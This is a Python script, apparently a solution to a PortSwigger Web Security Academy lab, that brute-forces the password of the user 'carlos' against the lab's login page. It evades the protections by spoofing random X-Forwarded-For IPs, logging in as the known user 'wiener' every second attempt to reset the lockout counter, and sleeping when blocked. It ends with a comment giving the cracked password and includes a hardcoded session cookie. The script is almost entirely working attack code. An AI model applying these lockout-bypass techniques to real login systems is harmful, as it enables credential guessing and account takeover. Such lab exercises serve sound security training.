import requests
import random
import time

DOMAIN = "0a76001a04fd1e0882c4d8c700da002d.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=4tlYYXG4HGRzMyxMbP0kwQ8un324pwzT",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers",
    "X-Forwarded-For": "123.123.123.123"
}

with open("../passwords.dic", "r") as f:
    passwords = f.readlines()

def gen_random_ip():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"


def login(username, password):
    data = {
        "username": username,
        "password": password
    }

    HEADERS["X-Forwarded-For"] = gen_random_ip()

    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data)

    if username == "wiener" and password == "peter":
        pass
    else:
        print(f"Trying {username}:{password}")
    
    if username == "wiener" and password == "peter":
        pass
    elif "Your username is:" in response.text:
        print(f"Password for {username} is {password}")

    if "You have made too many incorrect login attempts. Please try again in 1 minute" in response.text:
        print("Too many login attempts. Sleeping for 1 minute...")
        time.sleep(60)

    return response

def brute_force_password(username):
    i = 0
    for password in passwords:
        i += 1
        if i % 2 == 0:
            login("wiener", "peter")
        login(username, password.strip())

brute_force_password("carlos") # Password for carlos is taylor